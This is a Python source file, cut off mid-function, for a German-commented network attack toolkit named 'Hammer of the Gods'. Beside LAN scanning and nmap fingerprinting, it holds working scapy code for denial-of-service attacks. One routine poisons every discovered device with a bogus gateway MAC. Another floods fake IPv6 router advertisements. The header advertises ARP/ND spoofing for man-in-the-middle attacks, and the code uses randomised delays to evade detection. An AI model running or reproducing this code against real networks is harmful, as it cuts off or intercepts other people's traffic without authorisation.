#!/usr/bin/env python3
"""
HAMMER OF THE GODS - Extended Network Toolkit
---------------------------------------------
Features:
 - CLI-Menü mit 13 Einträgen (zusätzlich optimierter Scan, IPv6 Blackout und iptables-Blackout)
 - Kombinierter IPv4-Netzwerkscan (ARP, Ping-Sweep, Nmap-Discovery, Service-Scan)
 - Erweiterter IPv6-Netzwerkscan (Nmap-Discovery, OS-Fingerprinting, Service-Scan)
 - Künstlerische Terminal-Ausgabe inkl. Banner
 - Tabellarische Anzeige gefundener Geräte (tabulate)
 - MAC-Vendor-Lookup (erweitert via maclookup.app)
 - ARP-Spoofing (MITM/Block) für IPv4
 - IPv6 ND-Spoofing (MITM/Block) für IPv6
 - DAI/Port-Security/WLAN-Isolation-Test (ARP-basiert)
 - DNS-Hostname-Lookup (Reverse DNS)
 - Hinweise zu DNS-Spoofing, SSL-Strip u.a. MITM-Techniken
 - Blackout: Gesamter Netzwerkverkehr (IPv4) blockieren (über ARP-Spoofing oder iptables)
 - IPv6 Blackout via Fake-Router-Advertisements
 - Umfangreiches Logging (CSV) mit log_level-Unterstützung
 - Asynchrone Operationen und dynamische Verzögerungen zur Erhöhung der Scangeschwindigkeit und Reduzierung der Erkennung
"""

import os
import sys
import time
import threading
import subprocess
import datetime
import ipaddress
import socket
import netifaces
import random
import asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from tabulate import tabulate
    TABULATE_AVAILABLE = True
except ImportError:
    TABULATE_AVAILABLE = False

try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

# Neuer Import für erweiterte MAC-Vendor-Abfrage
try:
    import requests
except ImportError:
    requests = None

######################################################################
#                    HILFSFUNKTIONEN FÜR VALIDIERUNG
######################################################################

def validate_ip(ip_str):
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False

def validate_mac(mac_str):
    parts = mac_str.split(":")
    if len(parts) != 6:
        return False
    for part in parts:
        if len(part) != 2:
            return False
        try:
            int(part, 16)
        except ValueError:
            return False
    return True

######################################################################
#                  DYNAMISCHE DELAY-FUNKTION (STEALTH)
######################################################################

# Globaler Durchschnittswert für Ping-Antwortzeiten (in Sekunden)
avg_ping_time = 1.0
def update_avg_ping_time(new_time):
    global avg_ping_time
    avg_ping_time = (avg_ping_time + new_time) / 2.0

def stealth_delay():
    base_delay = random.uniform(0.3, 2.5)
    # Dynamischer Faktor: Ist der Durchschnittswert größer als 0.5, wird der Delay erhöht.
    factor = avg_ping_time / 0.5
    return base_delay * factor

######################################################################
#                         LOGGING-KOMPONENTE
######################################################################

class PenTestLogger:
    def __init__(self, log_to_console=True, log_file=None, log_level="INFO"):
        self.log_to_console = log_to_console
        self.log_file = log_file
        self.log_level = log_level  # z. B. "DEBUG", "INFO", "WARNING", "ERROR"
        self.levels = {"DEBUG": 10, "INFO": 20, "STATS": 25, "WARNING": 30, "ERROR": 40}
        if self.log_file:
            with open(self.log_file, 'w') as f:
                f.write("timestamp,event,message\n")
    def log(self, event, message):
        if self.levels.get(event, 20) >= self.levels.get(self.log_level, 20):
            timestamp = datetime.datetime.now().isoformat()
            log_line = f"{timestamp},{event},{message}"
            print(f"[{timestamp}] [{event}] {message}")
            if self.log_file:
                with open(self.log_file, 'a') as f:
                    f.write(f"{log_line}\n")

######################################################################
#                   SYSTEM- UND HELPER-FUNKTIONEN
######################################################################

def safe_run(command, logger):
    """Führt einen Shell-Befehl sicher aus und loggt Fehler."""
    try:
        subprocess.run(command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    except subprocess.CalledProcessError as e:
        logger.log("ERROR", f"Befehl fehlgeschlagen: {command} -> {e.stderr}")

def enable_ip_forward(logger):
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        with open("/proc/sys/net/ipv6/conf/all/forwarding", "w") as f:
            f.write("1")
        logger.log("INFO", "IPv4- und IPv6-Forwarding aktiviert.")
    except Exception as e:
        logger.log("ERROR", f"Fehler beim Aktivieren von IP-Forwarding: {e}")
        sys.exit(1)

def disable_ip_forward(logger):
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
        with open("/proc/sys/net/ipv6/conf/all/forwarding", "w") as f:
            f.write("0")
        logger.log("INFO", "IPv4- und IPv6-Forwarding deaktiviert.")
    except Exception as e:
        logger.log("ERROR", f"Fehler beim Deaktivieren von IP-Forwarding: {e}")
        sys.exit(1)

def block_target_traffic(target_ip, logger, direction="FORWARD", protocol=None):
    is_ipv6 = (":" in target_ip)
    cmd = ["ip6tables", "-I", direction] if is_ipv6 else ["iptables", "-I", direction]
    if protocol:
        cmd.extend(["-p", protocol])
    cmd.extend(["-s", target_ip, "-j", "DROP"])
    try:
        subprocess.run(cmd, check=True)
        logger.log("INFO", f"Blockiere Verkehr (direction={direction}, protocol={protocol}, ip={target_ip}).")
    except subprocess.CalledProcessError as e:
        logger.log("ERROR", f"Fehler beim Blockieren ({'ip6tables' if is_ipv6 else 'iptables'}): {e}")
        sys.exit(1)

def unblock_target_traffic(target_ip, logger, direction="FORWARD", protocol=None):
    is_ipv6 = (":" in target_ip)
    cmd = ["ip6tables", "-D", direction] if is_ipv6 else ["iptables", "-D", direction]
    if protocol:
        cmd.extend(["-p", protocol])
    cmd.extend(["-s", target_ip, "-j", "DROP"])
    try:
        subprocess.run(cmd, check=True)
        logger.log("INFO", f"Hebt Blockierung auf (direction={direction}, protocol={protocol}, ip={target_ip}).")
    except subprocess.CalledProcessError as e:
        logger.log("ERROR", f"Fehler beim Aufheben der Blockierung ({'ip6tables' if is_ipv6 else 'iptables'}): {e}")
        sys.exit(1)

def get_default_gateway(logger):
    gateways = netifaces.gateways()
    default = gateways.get('default', {}).get(netifaces.AF_INET)
    if default:
        logger.log("INFO", f"Gefundenes Default-Gateway (IPv4): {default[0]}")
        return default[0]
    logger.log("WARNING", "Kein Standard-Gateway (IPv4) gefunden.")
    return None

def get_own_mac(iface, logger):
    try:
        mac = netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr']
        logger.log("INFO", f"Eigene MAC auf {iface}: {mac}")
        return mac
    except (KeyError, IndexError):
        logger.log("ERROR", f"Keine MAC-Adresse für {iface} gefunden.")
        return None

def ping_host(ip, timeout=1):
    cmd = ["ping6", "-c", "1", "-W", str(timeout), ip] if ":" in ip else ["ping", "-c", "1", "-W", str(timeout), ip]
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return (result.returncode == 0)

def lookup_vendor_by_mac(mac):
    if not mac:
        return "Unbekannter Hersteller"
    prefix = mac[:8].upper()
    db = {
        "AC:DE:48": "Apple, Inc.",
        "00:1E:06": "Cisco Systems",
        "00:50:56": "VMware, Inc.",
        "00:15:5D": "Microsoft Corp."
    }
    if prefix in db:
        return db[prefix]
    if requests:
        try:
            url = f"https://api.maclookup.app/v2/macs/{mac}"
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                data = response.json()
                vendor = data.get("company", "Unbekannter Hersteller")
                return vendor
            else:
                return "Unbekannter Hersteller"
        except Exception:
            return "Unbekannter Hersteller"
    else:
        return "Unbekannter Hersteller"

def get_mac_via_arp(iface, ip, logger, timeout=3):
    if ":" in ip:
        logger.log("INFO", f"IPv6 -> kein ARP für {ip}.")
        return None
    try:
        from scapy.all import Ether, ARP, srp
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_req = ARP(pdst=ip)
        ans, _ = srp(ether/arp_req, iface=iface, timeout=timeout, verbose=0)
        for _, r in ans:
            return r.hwsrc
    except Exception as e:
        logger.log("ERROR", f"Fehler bei get_mac_via_arp für {ip}: {e}")
    return None

def reverse_dns_lookup(ip):
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        return hostname
    except Exception:
        return None

######################################################################
#             ASYNCHRONE FUNKTIONEN (PING & SCAN)
######################################################################

async def async_ping_host(ip, timeout=1):
    import time
    start = time.time()
    try:
        proc = await asyncio.create_subprocess_exec(
            "ping6" if ":" in ip else "ping",
            "-c", "1",
            "-W", str(timeout),
            ip,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        response_time = time.time() - start
        if proc.returncode == 0:
            update_avg_ping_time(response_time)
            return True
        else:
            return False
    except Exception:
        return False

async def async_ping_sweep_subnet(subnet_str, logger, timeout=1):
    logger.log("INFO", f"Async Ping-Sweep auf {subnet_str} (Timeout={timeout}s)...")
    net = ipaddress.IPv4Network(subnet_str, strict=False)
    hosts = list(net.hosts())
    tasks = []
    for ip in hosts:
        tasks.append(async_ping_host(str(ip), timeout))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    active = []
    for ip, res in zip(hosts, results):
        ip_str = str(ip)
        if isinstance(res, Exception):
            logger.log("ERROR", f"Fehler beim async Ping für {ip_str}: {res}")
        elif res:
            active.append(ip_str)
            logger.log("INFO", f"Host {ip_str} antwortet (async).")
    logger.log("INFO", f"Async Ping-Sweep abgeschlossen. {len(active)} aktive Hosts.")
    return active

async def async_scan_network_optimized(iface, logger):
    """ Führt asynchron ARP, Ping und (falls verfügbar) Nmap Discovery aus """
    print_banner()
    addrs = netifaces.ifaddresses(iface)
    if netifaces.AF_INET not in addrs:
        logger.log("ERROR", f"Keine IPv4-Adresse auf {iface}. Abbruch.")
        return {}
    ip_info = addrs[netifaces.AF_INET][0]
    local_ip = ip_info["addr"]
    netmask = ip_info["netmask"]
    network = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict=False)
    logger.log("INFO", f"Subnetz erkannt: {network}")

    discovered = {}
    loop = asyncio.get_running_loop()
    # ARP-Scan (synchron in Executor, da scapy nicht asynchron)
    arp_future = loop.run_in_executor(None, arp_scan_subnet, iface, network, logger, 5)
    # Asynchroner Ping-Sweep
    ping_future = async_ping_sweep_subnet(str(network), logger, 1)
    nmap_future = None
    if NMAP_AVAILABLE:
        nmap_future = loop.run_in_executor(None, nmap_host_discovery, network, logger)
    
    results = await asyncio.gather(arp_future, ping_future, nmap_future, return_exceptions=True)
    arp_result, ping_result, nmap_result = results
    if isinstance(arp_result, Exception):
         logger.log("ERROR", f"Fehler beim ARP-Scan: {arp_result}")
         arp_result = []
    if isinstance(ping_result, Exception):
         logger.log("ERROR", f"Fehler beim async Ping-Sweep: {ping_result}")
         ping_result = []
    if nmap_result is not None and isinstance(nmap_result, Exception):
         logger.log("ERROR", f"Fehler beim Nmap-Discovery: {nmap_result}")
         nmap_result = []

    if arp_result:
        for ip_, mac_ in arp_result:
            discovered[ip_] = {"mac": mac_, "vendor": lookup_vendor_by_mac(mac_), "reachable": False, "os": None, "name": None, "ports": "N/A"}
    if ping_result:
        for ip in ping_result:
            if ip in discovered:
                discovered[ip]["reachable"] = True
            else:
                discovered[ip] = {"mac": None, "vendor": None, "reachable": True, "os": None, "name": None, "ports": "N/A"}
    if nmap_result:
        for ip in nmap_result:
            if ip not in discovered:
                discovered[ip] = {"mac": None, "vendor": None, "reachable": True, "os": None, "name": None, "ports": "N/A"}
    
    logger.log("INFO", f"Async Scan abgeschlossen, {len(discovered)} Geräte gefunden.")
    return discovered

######################################################################
#                BLACKOUT-FUNKTIONEN
######################################################################

def blackout(iface, logger):
    """
    Blackout-Modus: Alle im IPv4-Netz entdeckten Geräte werden blockiert,
    indem ihnen via ARP ein ungültiger Gateway-Eintrag (MAC: 00:00:00:00:00:00) eingespeist wird.
    """
    logger.log("INFO", "Blackout gestartet: Alle Geräte werden blockiert.")
    gateway_ip = get_default_gateway(logger)
    if not gateway_ip:
        logger.log("ERROR", "Kein Gateway gefunden. Blackout abgebrochen.")
        return
    gw_mac = get_mac_via_arp(iface, gateway_ip, logger)
    if not gw_mac:
        gw_mac = input("Gateway-MAC nicht gefunden. Bitte manuell eingeben: ").strip()
        if not validate_mac(gw_mac):
            logger.log("ERROR", "Ungültiges MAC-Format für Gateway-MAC. Blackout abgebrochen.")
            return
    devices = scan_network_enhanced(iface, logger)
    if not devices:
        logger.log("WARNING", "Keine Geräte gefunden. Blackout nicht möglich.")
        return
    bogus_mac = "00:00:00:00:00:00"
    logger.log("INFO", "Sende Blackout-ARP-Pakete an alle Geräte...")
    from scapy.all import Ether, ARP, sendp
    # Bugfix: Korrekte Iteration über devices.items()
    for ip, dev in devices.items():
        target_ip = ip
        target_mac = dev.get("mac")
        if not target_mac:
            logger.log("WARNING", f"MAC für {target_ip} nicht gefunden, überspringe.")
            continue
        pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=bogus_mac)
        for _ in range(5):
            try:
                sendp(pkt, iface=iface, verbose=0)
            except Exception as e:
                logger.log("ERROR", f"Fehler beim Senden von ARP-Paket an {target_ip}: {e}")
            time.sleep(stealth_delay())
    logger.log("INFO", "Blackout abgeschlossen. Alle Geräte sollten nun blockiert sein.")

def ipv6_blackout(iface, logger):
    """ Blockiert IPv6-Geräte durch Fake-Router-Advertisments (RA) """
    from scapy.all import Ether, IPv6, ICMPv6ND_RA, sendp
    logger.log("INFO", "Starte IPv6 Blackout...")
    ra_packet = (Ether(dst="ff:ff:ff:ff:ff:ff") /
                 IPv6(dst="ff02::1", src="::1") /
                 ICMPv6ND_RA())
    for _ in range(10):
        try:
            sendp(ra_packet, iface=iface, verbose=0)
        except Exception as e:
            logger.log("ERROR", f"Fehler beim Senden von RA-Paket: {e}")
        time.sleep(0.5)
    logger.log("INFO", "IPv6 Blackout abgeschlossen.")

def blackout_iptables(logger):
    """ Aktiviert den Blackout über iptables-Regeln (IPv4) """
    logger.log("INFO", "Aktiviere Netzwerk-Blackout via iptables...")
    safe_run(["iptables", "-A", "INPUT", "-j", "DROP"], logger)
    safe_run(["iptables", "-A", "FORWARD", "-j", "DROP"], logger)
    logger.log("INFO", "Blackout aktiviert!")

######################################################################
#                MONITORING & SECURITY-TESTS
######################################################################

def monitor_target(target_ip, stop_event, logger, interval=5):
    while not stop_event.is_set():
        if ping_host(target_ip, timeout=1):
            logger.log("MONITOR", f"Ping von {target_ip} erhalten.")
        else:
            logger.log("MONITOR", f"Keine Antwort von {target_ip}.")
        time.sleep(interval)

def send_fake_arp(iface):
    from scapy.all import Ether, ARP, sendp
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    fake_mac = "de:ad:be:ef:00:01"
    fake_ip = "192.168.255.254"
    arp_pkt = ARP(op=2, pdst="192.168.255.1", hwdst="ff:ff:ff:ff:ff:ff", psrc=fake_ip, hwsrc=fake_mac)
    for _ in range(10):
        sendp(ether/arp_pkt, iface=iface, verbose=0)
        time.sleep(stealth_delay())

def sniff_arp_responses(iface, logger, duration):
    from scapy.all import ARP, sniff
    def arp_handler(pkt):
        if pkt.haslayer(ARP):
            a = pkt.getlayer(ARP)
            logger.log("SNIFF", f"ARP: op={a.op}, src_mac={a.hwsrc}, src_ip={a.psrc}")
    logger.log("INFO", f"Sniffe ARP für {duration}s auf {iface}...")
    sniff(iface=iface, filter="arp", prn=arp_handler, timeout=duration)

def detect_arp_security_mechanisms(iface, logger, duration=10):
    logger.log("INFO", "Starte ARP-Security-Test.")
    t = threading.Thread(target=sniff_arp_responses, args=(iface, logger, duration))
    t.start()
    send_fake_arp(iface)
    t.join()
    logger.log("INFO", "ARP-Security-Test beendet.")

def detect_ipv6_neighbors(iface, logger, duration=10):
    logger.log("INFO", f"Sniffe IPv6 ND-Pakete {duration}s auf {iface}...")
    def ipv6_handler(pkt):
        from scapy.all import IPv6, ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6ND_RA
        if pkt.haslayer(ICMPv6ND_NS):
            logger.log("SNIFFv6", f"NS von {pkt[IPv6].src} für {pkt[ICMPv6ND_NS].tgt}")
        elif pkt.haslayer(ICMPv6ND_NA):
            logger.log("SNIFFv6", f"NA von {pkt[IPv6].src}")
        elif pkt.haslayer(ICMPv6ND_RA):
            logger.log("SNIFFv6", f"RA von {pkt[IPv6].src}")
    from scapy.all import sniff
    sniff(iface=iface, filter="ip6", prn=ipv6_handler, timeout=duration)
    logger.log("INFO", "IPv6 ND-Sniff fertig.")

######################################################################
#              NETZWERK-SCAN (IPv4) – Zusatzfunktionen
######################################################################

def arp_scan_subnet(iface, subnet, logger, timeout=5):
    from scapy.all import srp, Ether, ARP
    logger.log("INFO", f"ARP-Scan auf {subnet} (Timeout={timeout}s)...")
    answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(subnet)),
                      timeout=timeout, iface=iface, verbose=0)
    results = []
    for _, recv in answered:
        results.append((recv.psrc, recv.hwsrc))
    logger.log("INFO", f"ARP-Scan abgeschlossen. {len(results)} Antworten erhalten.")
    return results

def ping_sweep_subnet(subnet, logger, timeout=1):
    logger.log("INFO", f"Ping-Sweep auf {subnet} (Timeout={timeout}s)...")
    net = ipaddress.IPv4Network(subnet, strict=False)
    active = []
    for ip in net.hosts():
        ip_str = str(ip)
        if ping_host(ip_str, timeout=timeout):
            active.append(ip_str)
            logger.log("INFO", f"Host {ip_str} antwortet.")
    logger.log("INFO", f"Ping-Sweep abgeschlossen. {len(active)} aktive Hosts.")
    return active

def nmap_host_discovery(subnet, logger):
    if not NMAP_AVAILABLE:
        logger.log("WARNING", "python-nmap nicht verfügbar. Überspringe Nmap.")
        return []
    logger.log("INFO", f"Nmap-Discovery auf {subnet}...")
    import nmap
    nm = nmap.PortScanner()
    nm.scan(hosts=str(subnet), arguments="-sn -n")
    found = []
    for host in nm.all_hosts():
        if nm[host].state() == "up":
            found.append(host)
    logger.log("INFO", f"Nmap-Discovery abgeschlossen. {len(found)} Hosts up.")
    return found

######################################################################
#              NETZWERK-SCAN (IPv6) – Zusatzfunktionen
######################################################################

def nmap_host_discovery_ipv6(subnet, logger):
    if not NMAP_AVAILABLE:
        logger.log("WARNING", "python-nmap nicht verfügbar. Überspringe Nmap IPv6 Discovery.")
        return []
    logger.log("INFO", f"Nmap-Discovery (IPv6) auf {subnet}...")
    import nmap
    nm = nmap.PortScanner()
    nm.scan(hosts=str(subnet), arguments="-6 -sn -n")
    found = []
    for host in nm.all_hosts():
        if nm[host].state() == "up":
            found.append(host)
    logger.log("INFO", f"Nmap-IPv6-Discovery abgeschlossen. {len(found)} Hosts up.")
    return found

def scan_network_ipv6(iface, logger):
    addrs = netifaces.ifaddresses(iface)
    if netifaces.AF_INET6 not in addrs:
        logger.log("ERROR", f"Keine IPv6-Adresse auf {iface} gefunden.")
        return []
    ipv6_list = addrs[netifaces.AF_INET6]
    global_addrs = [entry for entry in ipv6_list if not entry['addr'].lower().startswith("fe80")]
    available = global_addrs if global_addrs else ipv6_list
    print("Verfügbare IPv6-Adressen:")
    for i, entry in enumerate(available, start=1):
        print(f"{i}. {entry['addr']} (Netmask: {entry.get('netmask', 'N/A')})")
    choice = input("Bitte Nummer der IPv6-Adresse wählen: ").strip()
    if not choice.isdigit() or int(choice) < 1 or int(choice) > len(available):
        logger.log("ERROR", "Ungültige Auswahl.")
        return []
    chosen = available[int(choice)-1]
    chosen_addr = chosen['addr']
    netmask_field = chosen.get('netmask', '')
    if '/' in netmask_field:
        try:
            prefix = netmask_field.split('/')[1]
        except IndexError:
            prefix = "64"
    else:
        try:
            prefix = str(ipaddress.IPv6Network("::/" + netmask_field).prefixlen)
        except Exception as e:
            logger.log("ERROR", f"Fehler beim Konvertieren des Netmask: {e}")
            prefix = "64"
    try:
        network = ipaddress.IPv6Network(f"{chosen_addr}/{prefix}", strict=False)
    except Exception as e:
        logger.log("ERROR", f"Fehler bei der Berechnung des IPv6-Netzwerks: {e}")
        return []
    logger.log("INFO", f"IPv6-Netzwerk erkannt: {network}")
    use_nmap = (input("Nmap-Discovery (IPv6) nutzen? (j/n): ").lower() == "j")
    discovered = {}
    if use_nmap and NMAP_AVAILABLE:
        discovered_ips = nmap_host_discovery_ipv6(network, logger)
        for ip in discovered_ips:
            discovered[ip] = {"mac": "N/A", "vendor": "N/A", "reachable": True, "os": None, "name": None, "ports": "N/A"}
    else:
        logger.log("WARNING", "Nmap-Discovery für IPv6 nicht genutzt oder nicht verfügbar.")
    for ip, info in discovered.items():
        name = reverse_dns_lookup(ip)
        info["name"] = name if name else "N/A"
    use_os = (input("Nmap-OS-Fingerprinting (IPv6) durchführen? (j/n): ").lower() == "j")
    if use_os and NMAP_AVAILABLE:
        logger.log("INFO", "Nmap-OS-Fingerprinting (IPv6) gestartet...")
        nm = nmap.PortScanner()
        for ip, info in discovered.items():
            try:
                nm.scan(ip, arguments="-6 -O -Pn")
                if ip in nm.all_hosts() and 'osmatch' in nm[ip]:
                    matches = nm[ip]['osmatch']
                    if matches:
                        info["os"] = matches[0]['name']
            except Exception as e:
                logger.log("ERROR", f"Fehler beim OS-Scan (IPv6) {ip}: {e}")
    elif use_os:
        logger.log("WARNING", "python-nmap nicht installiert. OS-Fingerprinting nicht möglich.")
    use_service = (input("Service-Scan (IPv6) durchführen? (j/n): ").lower() == "j")
    if use_service and NMAP_AVAILABLE:
        logger.log("INFO", "Service-Scan (IPv6) gestartet...")
        nm = nmap.PortScanner()
        for ip, info in discovered.items():
            try:
                nm.scan(ip, arguments="-6 -sV -Pn")
                if ip in nm.all_hosts() and 'tcp' in nm[ip]:
                    ports = []
                    for port in sorted(nm[ip]['tcp']):
                        port_info = nm[ip]['tcp'][port]
                        service = port_info.get('name', '')
                        state = port_info.get('state', '')
                        ports.append(f"{port}/{state} ({service})")
                    info["ports"] = ", ".join(ports) if ports else "Keine offenen Ports"
            except Exception as e:
                logger.log("ERROR", f"Fehler beim Service-Scan (IPv6) {ip}: {e}")
    result_list = []
    for ip, info in discovered.items():
        result_list.append({
            "ip": ip,
            "mac": info.get("mac", "N/A"),
            "vendor": info.get("vendor", "N/A"),
            "reachable": "Erreichbar" if info.get("reachable") else "Keine Antwort",
            "os": info.get("os") or "N/A",
            "name": info.get("name") or "N/A",
            "ports": info.get("ports", "N/A")
        })
    result_list.sort(key=lambda x: ipaddress.IPv6Address(x["ip"]))
    logger.log("INFO", f"IPv6-Scan abgeschlossen, {len(result_list)} Geräte gefunden.")
    return result_list

######################################################################
#                KÜNSTLERISCHE TERMINAL-AUSGABE
######################################################################

def print_banner():
    art = r"""
MMMMMMMWNNNNNNNWMMMMMMMWNNNNNNNWMMMMMMMWNNNNNNNNWMMMMMMMWNNNNNNNMMMMMMMMWNNNNNNW
MMMMMMMWNNNNNNNWMMMMMWMWNNNNNNWWMMMMMMMWNNNNNNNNWMMMMMMMWNNXNNNNWMMMMMMMWNNNNNNW
MMMMMMMWNNNNNNNWWWMMMMWXKXNNNNNWMMMWNNNNNNNNNNNNNWMMMWNNWN0kKNNWWMMMMMMMWNNNNNNW
WWWWWWWWWWWWWWWXOKWWWXkxKNNXXXKXXXXXKKK000KKKKKKKKNWWWKkONOloONWWWWWWWWWWWWWWWWW
NNNNNNNWMMMMWWWOokXN0olOKKXNNNNNXK00KKKKXXNNNNNXK0000XKock0o:ckNWNNNNNNWWMMMMMMM
NNNNNNNWWWWWMNOlckNXxdOXNNWWMMMWWWWNNNWWWWWMMMMMWNX0OOOdccdo::ckNNNNNNNNWWMMMMMM
NNNNNNNNNNNNN0oclkKkdOXWMMMMMMWWX0xl:cd0XNWWMMMMMWNNWKxoc::::::l0NNNNNNNNNNWWMMM
WWNNNNXXNNNNXxcccooxKNWWMMMMMXkl;'.....,:lkXNWMMMMMMMWX0Okl::::cxXXXXXNNNNNNNWWW
MWNXNNXXNXKX0o::cd0WMMWMMMMXx;.........',,,cxKNWMMMMMMMMWWKxl:;cxKXXXNNXXNNNXNNW
WNNNNNXOkkx0OlldONWMMWWMMNx;...........''''',cxKWWMMMMMMWWWNKkdodkKXXXXXXXXXXXNN
WXNNNNXOooxxxxkOKKKXWMMW0c..............'''',,,cONMWWMMMWKkdolodolx0KKKXXXXXXXNN
NNNNNKxdOOkxolcccllokXWk,...............'''''',,;xNWWMMMNKK0koc:;;dOOO0Kkx0XXXXN
NNXXXOl:ldxxlcclx0KKXXk,................''....''',oXWWMMWWWNX0dlc:lddk0kcckXXXXW
NNXXXx:::lolc::cdkKNWO,  ......................''.'oXWWWWNNNKOocccloxKOc;:dKXXNW
NNXXKo;:ldl:;:coxOKXKc.  .........'',,,'.........'.'kNNNNXXXXXKOkxxloko;;;oKKXNW
WWNX0o;;clcldk0KXKKXx.   .....,:loxkOkkdoc;'........:KNXXKKXXKKKKOl;lxo:;;o0KXWW
MMWNKd:;;;cdO00KKKK0:   ...':dOKXXXNNNNNXXOo;'.......oXXKKKKKK00OOo;;cc;,;dKXNNW
MMMWNOl;;;:d000KK0KO,     .okkkOKNX0KXNNNNKko;'......'xXKKK0KK00Oxl;,;:;;ckXNNNW
MMMMMXd::::lx00OO0KO;     ';.. .'cxkkkd:;,.. ... .....c0KKKK0O00Oo:,,,;;;c0NNNNN
WWWWWNx:::::okocx000c     ,;... .,xOkkc.     .,.    ...dXKKKOO00Okl;,,;;;lKWWWWW
NNNNNW0c,;;;cl:oO00Kk'   .okdddoloc'.;xxolcc:ok:    ..;kXK0OOK00xldl;,;,:OWWMMMM
WNNNXKKk:,;;;cdO0000k:.   .;lc:lxk:...d0kd:clc:.   ..:kKKKK00K00klcc;,;;ldxXMMMM
NNNNX0Okxl;,;cdkOkOO;...      ..l0KOxOKkl;.       .;d0KKKKKKK0xk0kxo;;;;;ckNWMMM
WWWWWNK0kxoc;;;loox:.         .'ckKKXKOo;,.    ..'o0KKK00KKK00000Od:;;oO0XWWWWWW
MMMMMMWNK0ko::;;:dc..           ..,::'..     ....:OKKKK0dok000Oxxxc;,:OX00NNNNNN
MMMMMMWNXNNKxc;;:ll:,'.         ..... ...        .:x0K00x:;lOOl::;,,:dOkk0XNNNNN
WNNNNNXOkkkdl;;;;;cl,          .';,','..       ....o0KKkdc:do;,,,;cdxkkOKXNNNNN
WWWWWWWKxl;,,;;,,,;:'            ..''....     .......oK0kOxlc:,,,;cdxkkkOXWWWWWW
NNNNNNNWWNK000Oxoll'           .  ... ..   ...........dOool,,,,,,;oxk0KXNWMMMMMM
NNNNNNNWWWMMMNXNXk,.  ...      .  ... .. .............,l:,,''',;:lddkKNNWMMMMMMM
NNNNNNNWWWMMMWNWK:.. ..... .....  ... .................,:,'',;cloodkKNNNWMMMMMMM
WWWWWWWWMMMMMMMWNWWNNWWWMMMMMMMWNNNNNNWWMMMMMMMWWNNNNNNNWMWWMMMMWNWWNNWWWMMMMMMM
    """
    print("\033[96m" + art + "\033[0m")
    print("\033[92mEpic Network Scan Initiated by HackDevOli!\033[0m\n")

def merge_hosts_info(ip_list, existing_dict):
    for ip in ip_list:
        if ip not in existing_dict:
            existing_dict[ip] = {"mac": None, "vendor": None, "reachable": True, "os": None, "name": None, "ports": "N/A"}
    return existing_dict

def scan_network_enhanced(iface, logger):
    print_banner()
    addrs = netifaces.ifaddresses(iface)
    if netifaces.AF_INET not in addrs:
        logger.log("ERROR", f"Keine IPv4-Adresse auf {iface}. Abbruch.")
        return {}
    ip_info = addrs[netifaces.AF_INET][0]
    local_ip = ip_info["addr"]
    netmask = ip_info["netmask"]
    network = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict=False)
    logger.log("INFO", f"Subnetz erkannt: {network}")
    use_ping = (input("Ping-Sweep nutzen? (j/n): ").lower() == "j")
    use_nmap = (input("Nmap-Discovery nutzen? (j/n): ").lower() == "j")
    discovered = {}
    futures = {}
    with ThreadPoolExecutor(max_workers=2) as executor:
        futures[executor.submit(arp_scan_subnet, iface, network, logger, timeout=5)] = 'arp'
        if use_ping:
            futures[executor.submit(ping_sweep_subnet, network, logger, timeout=1)] = 'ping'
        results = {}
        for future in as_completed(futures):
            scan_type = futures[future]
            try:
                res = future.result()
                results[scan_type] = res
            except Exception as e:
                logger.log("ERROR", f"Fehler beim {scan_type} Scan: {e}")
    if 'arp' in results:
        for ip_, mac_ in results['arp']:
            discovered[ip_] = {
                "mac": mac_,
                "vendor": lookup_vendor_by_mac(mac_),
                "reachable": ping_host(ip_, timeout=1),
                "os": None,
                "name": None,
                "ports": "N/A"
            }
    if use_ping and 'ping' in results:
        pinged = results['ping']
        merge_hosts_info(pinged, discovered)
    if use_nmap and not discovered:
        logger.log("INFO", "Keine Geräte durch ARP/Ping gefunden, starte Nmap-Discovery.")
        nmap_list = nmap_host_discovery(network, logger)
        merge_hosts_info(nmap_list, discovered)
    elif use_nmap:
        logger.log("INFO", "Geräte bereits durch ARP/Ping gefunden, überspringe Nmap-Discovery.")
    for ip_, info in discovered.items():
        if not info["mac"]:
            found_mac = get_mac_via_arp(iface, ip_, logger, timeout=3)
            if found_mac:
                info["mac"] = found_mac
                info["vendor"] = lookup_vendor_by_mac(found_mac)
        if info["reachable"] is None:
            info["reachable"] = ping_host(ip_, timeout=1)
    for ip_, info in discovered.items():
        name = reverse_dns_lookup(ip_)
        if name:
            info["name"] = name
    use_os = (input("Nmap-OS-Fingerprinting durchführen? (j/n): ").lower() == "j")
    if use_os and NMAP_AVAILABLE:
        logger.log("INFO", "Nmap-OS-Fingerprinting gestartet...")
        nm = nmap.PortScanner()
        for ip_, info in discovered.items():
            if info["reachable"]:
                try:
                    nm.scan(ip_, arguments="-O -Pn")
                    if ip_ in nm.all_hosts():
                        if 'osmatch' in nm[ip_]:
                            matches = nm[ip_]['osmatch']
                            if matches:
                                info["os"] = matches[0]['name']
                except Exception as e:
                    logger.log("ERROR", f"Fehler beim OS-Scan {ip_}: {e}")
    elif use_os:
        logger.log("WARNING", "python-nmap nicht installiert. OS-Fingerprinting nicht möglich.")
    use_service_scan = (input("Service-Scan (Ports/Services) durchführen? (j/n): ").lower() == "j")
    if use_service_scan and NMAP_AVAILABLE:
